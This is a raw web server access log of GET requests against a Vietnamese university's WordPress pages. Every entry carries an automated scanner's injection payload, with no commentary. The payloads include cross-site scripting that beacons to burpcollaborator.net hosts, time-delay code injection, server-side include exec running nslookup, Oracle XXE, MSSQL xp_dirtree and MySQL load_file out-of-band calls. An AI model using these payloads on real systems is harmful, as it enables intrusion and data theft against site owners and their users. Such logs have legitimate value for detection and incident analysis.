GET /index.php/2017/03/13/cac-huong-nghien-cuu-khmt/?javascript%3a%2f*%3c%2fscript%3e%3csvg%2fonload%3d'%2b%2f%22%2f%2b%2fonmouseover%3d1%2f%2b%2f[*%2f[]%2f%2b((new(Image)).src%3d([]%2b%2f%5c%2fyxz2klazwxunfgft9jp4dv1ie9k1i56xxlr8hw6%5c.burpcollaborator.net%2f).replace(%2f%5c%5c%2fg%2c[]))%2f%2f'%3e=1 ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?eval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))=1 ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ktmt/?'%22%3e%3csvg%2fonload%3d(new(Image)).src%3d'%2f%2fhj4l64wiigg61z1cv2bnzen10s6k4pshi5cs2gr%5c56burpcollaborator.net'%3e=1 ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?(function()%7bif(typeof%20vv0qa%3d%3d%3d'undefined')%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3bvv0qa%3d1%3b%7d%7d())=1 ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ktmt/?javascript%3a%2f*%3c%2fscript%3e%3csvg%2fonload%3d'%2b%2f%22%2f%2b%2fonmouseover%3d1%2f%2b%2f[*%2f[]%2f%2b((new(Image)).src%3d([]%2b%2f%5c%2fmi8q59vnhlfb040hu7asyjm6zx5p3urmiacx2lr%5c.burpcollaborator.net%2f).replace(%2f%5c%5c%2fg%2c[]))%2f%2f'%3e=1 ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?1'%2b(function()%7bif(typeof%20rjo5u%3d%3d%3d%22undefined%22)%7bvar%20a%3dnew%20Date()%3bdo%7bvar%20b%3dnew%20Date()%3b%7dwhile(b-a%3c20000)%3brjo5u%3d1%3b%7d%7d())%2b'=1 ,1
GET /index.php/2017/03/13/cac-mon-hoc-ktmt/?%22--%3e'--%3e%60--%3e%3c!--%23set%20var%3d%22hef%22%20value%3d%22gdek03qhcf%22--%3e%3c!--%23set%20var%3d%22jgh%22%20value%3d%22ifgm25sjeh%22--%3e%3c!--%23echo%20var%3d%22hef%22--%3e%3c!--%23echo%20var%3d%22jgh%22--%3e%3c!--%23exec%20cmd%3d%22nslookup%20-q%3dcname%203017nqd4z2xsiliycos9g04nhen6m0as8g23srh.burpcollaborator.net%22%20--%3e=1 ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ttmt/?'%22%3e%3csvg%2fonload%3d(new(Image)).src%3d'%2f%2fpibt5cvqhofe070kuaavymm9z05s4jsbizcm2ar%5c56burpcollaborator.net'%3e=1 ,1
GET /index.php/2017/03/13/cac-huong-nghien-cuu-ttmt/?javascript%3a%2f*%3c%2fscript%3e%3csvg%2fonload%3d'%2b%2f%22%2f%2b%2fonmouseover%3d1%2f%2b%2f[*%2f[]%2f%2b((new(Image)).src%3d([]%2b%2f%5c%2ffh0j42uggee4zxzat09lxclzyq4i39r1ipcc20r%5c.burpcollaborator.net%2f).replace(%2f%5c%5c%2fg%2c[]))%2f%2f'%3e=1 ,1
GET /index.php/2017/03/13/'%22%3e%3csvg/onload%3d(new(Image)).src%3d'//8ktc7vx9j7hx2q23wtce05os1j7b59t1jpgc60v%5c56burpcollaborator.net'%3e/ ,1
GET /index.php/2017/03/13/'%22%3e%3csvg/onload%3d(new(Image)).src%3d'//i2lmp5fj1hz7k0kde3uoif62jtplobc32rzep2e%5c56burpcollaborator.net'%3e/ ,1
GET /index.php/2017/03/13/'%22%3e%3csvg/onload%3d(new(Image)).src%3d'//yvx2il8zuxsndgdt7jn4bvzic9i1g04sugr3hr6%5c56burpcollaborator.net'%3e/ ,1
GET /index.php/2017/03/13/'%22%3e%3csvg/onload%3d(new(Image)).src%3d'//p6wttcjq5o3eo7okiayvmma9n0tsrufm5a2xslh%5c56burpcollaborator.net'%3e/ ,1
GET /index.php/2017/03/13/javascript%3a/*%3c/script%3e%3csvg/onload%3d'%2b/%22/%2b/onmouseover%3d1/%2b/[*/[]/%2b((new(Image)).src%3d([]%2b/%5c/6dka0tq7c5avvov1pr5ct3hquh09y7mzdnaa0yp%5c.burpcollaborator.net/).replace(/%5c%5c/g%2c[]))//'%3e/ ,1
GET /index.php/2017/03/13/'%22%3e%3csvg/onload%3d(new(Image)).src%3d'//97eduwka684yprp4juzfn6btokucsdg56t3gt4i%5c56burpcollaborator.net'%3e/ ,1
GET /index.php/2017/03/13/'%22%3e%3csvg/onload%3d(new(Image)).src%3d'//2nq6ap03m1kr5k5xznf83zrm4da588w0mojb9zy%5c56burpcollaborator.net'%3e/ ,1
GET /index.php/2017/03/13/'%22%3e%3csvg/onload%3d(new(Image)).src%3d'//6w3ajt97v5tveoe18rocc30qdhj9h951vpsci07%5c56burpcollaborator.net'%3e/ ,1
GET /index.php/2017/03/13/javascript%3a/*%3c/script%3e%3csvg/onload%3d'%2b/%22/%2b/onmouseover%3d1/%2b/[*/[]/%2b((new(Image)).src%3d([]%2b/%5c/1fh52os2e0cqxjxwrm77vyjlwc241upmgadx3ls%5c.burpcollaborator.net/).replace(/%5c%5c/g%2c[]))//'%3e/ ,1
GET /index.php/2017/03/13/javascript%3a/*%3c/script%3e%3csvg/onload%3d'%2b/%22/%2b/onmouseover%3d1/%2b/[*/[]/%2b((new(Image)).src%3d([]%2b/%5c/xfg12ksyewcmxfxsri73vujhw82002oufic52tr%5c.burpcollaborator.net/).replace(/%5c%5c/g%2c[]))//'%3e/ ,1
GET /index.php/2017/03/13/javascript%3a/*%3c/script%3e%3csvg/onload%3d'%2b/%22/%2b/onmouseover%3d1/%2b/[*/[]/%2b((new(Image)).src%3d([]%2b/%5c/0lm48ny1kzip3i3vxld61xpk2b8362uulii58tx%5c.burpcollaborator.net/).replace(/%5c%5c/g%2c[]))//'%3e/ ,1
GET /index.php/2017/03/13/javascript%3a/*%3c/script%3e%3csvg/onload%3d'%2b/%22/%2b/onmouseover%3d1/%2b/[*/[]/%2b((new(Image)).src%3d([]%2b/%5c/9gqd3wtaf8dyyry4su8fw6ktxk3c1dp5gtdg34s%5c.burpcollaborator.net/).replace(/%5c%5c/g%2c[]))//'%3e/ ,1
GET /index.php/2017/03/13/javascript%3a/*%3c/script%3e%3csvg/onload%3d'%2b/%22/%2b/onmouseover%3d1/%2b/[*/[]/%2b((new(Image)).src%3d([]%2b/%5c/b9lfwymc8a60rtr6lw1hp8dvqmweuhi99x6kw8l%5c.burpcollaborator.net/).replace(/%5c%5c/g%2c[]))//'%3e/ ,1
GET /index.php/2017/03/13/javascript%3a/*%3c/script%3e%3csvg/onload%3d'%2b/%22/%2b/onmouseover%3d1/%2b/[*/[]/%2b((new(Image)).src%3d([]%2b/%5c/2tw6gp63s1qrbkbx5nl89zxmadg5e52xtlq8gw5%5c.burpcollaborator.net/).replace(/%5c%5c/g%2c[]))//'%3e/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-3/?'%22%3e%3csvg%2fonload%3d(new(Image)).src%3d'%2f%2fjd0n06qkcia8v1vep45ptgh3uu0mzen6du7hx5m%5c56burpcollaborator.net'%3e=1 ,1
GET /index.php/2017/03/13/'%22%3e%3csvg/onload%3d(new(Image)).src%3d'//rgbv3etsfqdgy9ymsc8xwokbx23u1ypqfec12pr%5c56burpcollaborator.net'%3e/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-3/?javascript%3a%2f*%3c%2fscript%3e%3csvg%2fonload%3d'%2b%2f%22%2f%2b%2fonmouseover%3d1%2f%2b%2f[*%2f[]%2f%2b((new(Image)).src%3d([]%2b%2f%5c%2fmndqa90nmlkb545hz7fs3jr64xap9hx9oxik88x%5c.burpcollaborator.net%2f).replace(%2f%5c%5c%2fg%2c[]))%2f%2f'%3e=1 ,1
GET /index.php/2017/03/13/javascript%3a/*%3c/script%3e%3csvg/onload%3d'%2b/%22/%2b/onmouseover%3d1/%2b/[*/[]/%2b((new(Image)).src%3d([]%2b/%5c/jk7n76xkjih8212ew4cp0go31u7m5qtik6ht7hw%5c.burpcollaborator.net/).replace(/%5c%5c/g%2c[]))//'%3e/ ,1
GET /index.php/2017/03/13/'%22%3e%3csvg/onload%3d(new(Image)).src%3d'//swswjf9tvrtheaen8doycp0cd3jvh05svgs3ir7%5c56burpcollaborator.net'%3e/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-ttm/?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20kskqa%20SYSTEM%20%22http%3a%2f%2f9u4dhw7at8rycrc46umfa6ytbkhcg74as4fu3j.burpcollab'%7c%7c'orator.net%2f%22%3e%25kskqa%3b]%3e')%2c'%2fl')%20from%20dual)=1 ,1
GET /index.php/2017/03/13/chi-hoi-cuu-giao-chuc/?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20wsvih%20SYSTEM%20%22http%3a%2f%2f7ltb8uy8k6iw3p32xsdd14pr2i8a76v9j36tui.burpcollab'%7c%7c'orator.net%2f%22%3e%25wsvih%3b]%3e')%2c'%2fl')%20from%20dual)=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-cnpm/?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20kyeqr%20SYSTEM%20%22http%3a%2f%2fzy13lmb0xyvoghguakq5ew2jfal2k083wxjn7c.burpcollab'%7c%7c'orator.net%2f%22%3e%25kyeqr%3b]%3e')%2c'%2fl')%20from%20dual)=1 ,1
GET /index.php/2017/03/13/javascript%3a/*%3c/script%3e%3csvg/onload%3d'%2b/%22/%2b/onmouseover%3d1/%2b/[*/[]/%2b((new(Image)).src%3d([]%2b/%5c/xfg12ksyewcmxfxsri73vujhw82005oxflc82wr%5c.burpcollaborator.net/).replace(/%5c%5c/g%2c[]))//'%3e/ ,1
GET /index.php/2017/03/13/chuong-trinh-dao-tao/?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20icubw%20SYSTEM%20%22http%3a%2f%2f637aqtg7250vlol1frvcj37qkhq9p6d913otci.burpcollab'%7c%7c'orator.net%2f%22%3e%25icubw%3b]%3e')%2c'%2fl')%20from%20dual)=1 ,1
GET /index.php/2017/03/13/'%22%3e%3csvg/onload%3d(new(Image)).src%3d'//plet8cyqkoie373kxadv1mp9208s7jvblzim8ax%5c56burpcollaborator.net'%3e/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-ttm/?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20kskqa%20SYSTEM%20%22http%3a%2f%2f7jrb6uw8i6gw1p12vsbdz4nr0i6a55t9h34tsi.burpcollab'%7c%7c'orator.net%2f%22%3e%25kskqa%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1 ,1
GET /index.php/2017/03/13/chuong-trinh-dao-tao/?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20icubw%20SYSTEM%20%22http%3a%2f%2fi4nmr5hj3h17m0mdg3wokf82ltrlqiem2gp6dv.burpcollab'%7c%7c'orator.net%2f%22%3e%25icubw%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-cnpm/?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20kyeqr%20SYSTEM%20%22http%3a%2f%2fk8tov7ll7j59q2qfk50qohc4pvvnulip6jt9hy.burpcollab'%7c%7c'orator.net%2f%22%3e%25kyeqr%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1 ,1
GET /index.php/2017/03/13/chi-hoi-cuu-giao-chuc/?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20wsvih%20SYSTEM%20%22http%3a%2f%2fwvv0ij8xuvsldedr7hn2btzgc7izhv5zttgj48.burpcollab'%7c%7c'orator.net%2f%22%3e%25wsvih%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-khmt/?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20shclx%20SYSTEM%20%22http%3a%2f%2f1pr5co22o0mq7j7w1mh75ytl6cc4b3z6n0aqyf.burpcollab'%7c%7c'orator.net%2f%22%3e%25shclx%3b]%3e')%2c'%2fl')%20from%20dual)=1 ,1
GET /index.php/2017/03/13/javascript%3a/*%3c/script%3e%3csvg/onload%3d'%2b/%22/%2b/onmouseover%3d1/%2b/[*/[]/%2b((new(Image)).src%3d([]%2b/%5c/lj8p68wmikga131gv6brzin50w6o5ft7kvhi76w%5c.burpcollaborator.net/).replace(/%5c%5c/g%2c[]))//'%3e/ ,1
GET /index.php/2017/03/13/co-so-vat-chat-ktmt/?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20yxbry%20SYSTEM%20%22http%3a%2f%2fh0iln4dizgx6izicc2snge41hsnkmkanyhl79w.burpcollab'%7c%7c'orator.net%2f%22%3e%25yxbry%3b]%3e')%2c'%2fl')%20from%20dual)=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-ttmt/?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20oypfb%20SYSTEM%20%22http%3a%2f%2fv1xzoiew0uykjdjqdgt1hs5fi6oyn0b3zxmnac.burpcollab'%7c%7c'orator.net%2f%22%3e%25oypfb%3b]%3e')%2c'%2fl')%20from%20dual)=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-cnpm/?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cfgzj32tgfed4yxyas08lwckzxq3i2gq7gvai06p.burpcollab'%2b'orator.net%5cfue'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/chuong-trinh-dao-tao/?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c3347qqg4220slllyfov9j07nkeq6p3du3ix5ntc.burpcollab'%2b'orator.net%5cjbc'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/chi-hoi-cuu-giao-chuc/?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cj1lno6ek0iy8j1jed4tphg53iuomnib91xvkl8a.burpcollab'%2b'orator.net%5clxx'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/cac-mon-hoc-ttm/?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cnqhrda3opmnc858i28it6ku77ydqcl0cq0knabz.burpcollab'%2b'orator.net%5ctuw'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-ttm/?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20fvqds%20SYSTEM%20%22http%3a%2f%2fe4jir1hf3d13mwm9gzwkkb8ylprhqiel2fp5du.burpcollab'%7c%7c'orator.net%2f%22%3e%25fvqds%3b]%3e')%2c'%2fl')%20from%20dual)=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-khmt/?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20shclx%20SYSTEM%20%22http%3a%2f%2fsmiw9fztlrjh4a4nydey2pqc339v8uwyks7iv7.burpcollab'%7c%7c'orator.net%2f%22%3e%25shclx%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-ktmt/?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20yxbry%20SYSTEM%20%22http%3a%2f%2fgj3k63whifg51y1bv1bmzdn00r6j5jtnhh47sw.burpcollab'%7c%7c'orator.net%2f%22%3e%25yxbry%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-ttmt/?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20oypfb%20SYSTEM%20%22http%3a%2f%2fo6vstbjp5n3do6oji9yumla8nztrstgx4rrhf6.burpcollab'%7c%7c'orator.net%2f%22%3e%25oypfb%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-cnpm/?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c4lq88ry5k3it3m3zxpda11po2f8775vwmkg76vv.burpcollab'%2b'orator.net%5cblo'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/chuong-trinh-dao-tao/?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cbapfxync9a70sts6mw2hq8evrmxewbk2bq5dv1k.burpcollab'%2b'orator.net%5crki'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/cac-mon-hoc-ttm/?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cvdcz0iqwcuakvdvqpg51tshfu60yztnke88vyjn.burpcollab'%2b'orator.net%5cygn'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/chi-hoi-cuu-giao-chuc/?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5ckxlok7alwju9f2ff95pqdh14evknjj7ayysli97.burpcollab'%2b'orator.net%5cwci'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-ttm/?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20fvqds%20SYSTEM%20%22http%3a%2f%2fj7rnu6kk6i48p1pej4zpngb3ouumtnhr5lsbg0.burpcollab'%7c%7c'orator.net%2f%22%3e%25fvqds%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-khmt/?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cvkjz7ixwjuhk2d2qwgc10sof167y6xuokcez4nt.burpcollab'%2b'orator.net%5czwf'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/danh-sach-bai-bao-khoa-hoc-cnpm/?(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20gmbnn%20SYSTEM%20%22http%3a%2f%2feo6ib11fndl36w690zgk4bsy5pbhakynmh97xw.burpcollab'%7c%7c'orator.net%2f%22%3e%25gmbnn%3b]%3e')%2c'%2fl')%20from%20dual)=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-ktmt/?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cmukqh97ntlrbc4ch67msajy6bxhpgp4gu4oref3.burpcollab'%2b'orator.net%5ccef'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-ttmt/?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5ckxlok7alwju9f2ff95pqdh14evknjp7gx4rrhf6.burpcollab'%2b'orator.net%5crdb'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-cnpm/?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5ceucih17ftdr3cwc96zmkabyybphhgf46wuqhg55.burpcollab'%2b'orator.net%5cwag'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/chuong-trinh-dao-tao/?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cep7ic12fodm37w791zhk5bty6pchbez5rtlgb40.burpcollab'%2b'orator.net%5ctku'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/cac-mon-hoc-ttm/?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cydf20lqzcxanvgvtpj54tvhiu901zwnnfb9yzmo.burpcollab'%2b'orator.net%5cmta'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/chi-hoi-cuu-giao-chuc/?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cqjdu6dwripgf181lvbbwznna016t5ptgl4fr5fu.burpcollab'%2b'orator.net%5cmot'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-khmt/?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c6x4akta7w5uvfof19rpcd31qehk9j87zynsaiy7.burpcollab'%2b'orator.net%5caak'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-ttm/?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c2336qpg3210rlklxfnv8jz7mkdq5p6dx3lx8nwc.burpcollab'%2b'orator.net%5cdqb'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-ktmt/?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5ccl1g8zydkbi13u37xxdi19pw2n8f7fv6mugh65v.burpcollab'%2b'orator.net%5cdhf'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/danh-sach-bai-bao-khoa-hoc-cnpm/?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20gmbnn%20SYSTEM%20%22http%3a%2f%2fv62ztijw5u3kodoqigy1msafn6tys1g54zrpfe.burpcollab'%7c%7c'orator.net%2f%22%3e%25gmbnn%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-ttmt/?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5civhmi58juhs7d0dd73nobfz2ctilhn5ew2qpgd5.burpcollab'%2b'orator.net%5citp'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-cnpm/?1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c929dpwfa18zykrk4euufi66tjkpcoac15pzcp0e.burpcollab'%2b'orator.net%5csmh'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/cac-mon-hoc-ttm/?1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cmh7q49unglebz4zht79sxjl6yx4p3krbkzem4at.burpcollab'%2b'orator.net%5cxwd'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/chuong-trinh-dao-tao/?1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5ctmjx9gzulsji4b4oyeez2qqd349w8twkp8jv9jy.burpcollab'%2b'orator.net%5cyxb'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/danh-sach-bai-bao-khoa-hoc-cnpm/?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c6lsa8ty7k5iv3o31xrdc13pq2h897cv3lrfe52u.burpcollab'%2b'orator.net%5cnpq'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-ttm/?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cke2o17rldjb9w2wfq56quhi4vv1n0ooff39qzeo.burpcollab'%2b'orator.net%5czch'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/chi-hoi-cuu-giao-chuc/?1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cywy2jl9zvxtneget8jo4cv0id9j1ix6ozctzjn8.burpcollab'%2b'orator.net%5cjih'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-ktmt/?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cshdw4futgrehzazntd9yxplcy34v3vrmjadx3ls.burpcollab'%2b'orator.net%5cikx'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-khmt/?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cjh4n46ukgie8z1zet49pxgl3yu4m3lrcj0dn3bs.burpcollab'%2b'orator.net%5ccow'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
GET /index.php/2017/03/13/'%22%3e%3csvg/onload%3d(new(Image)).src%3d'//x0y1nkdyzwxmifiscis3gu4hh8n0msak08xvnjc%5c56burpcollaborator.net'%3e/ ,1
GET /index.php/2017/03/13/cac-mon-hoc-ttm/?(select%20load_file('%5c%5c%5c%5cli7p58vmhkfa030gu6aryim5zw5o4jsauyole93.burpcollaborator.net%5c%5cdoc'))=1 ,1
GET /index.php/2017/03/13/co-so-vat-chat-ttmt/?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cqmgu9dzrlpjf484lybew2nqa319t8vwmoaix8lx.burpcollab'%2b'orator.net%5ccfi'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1 ,1
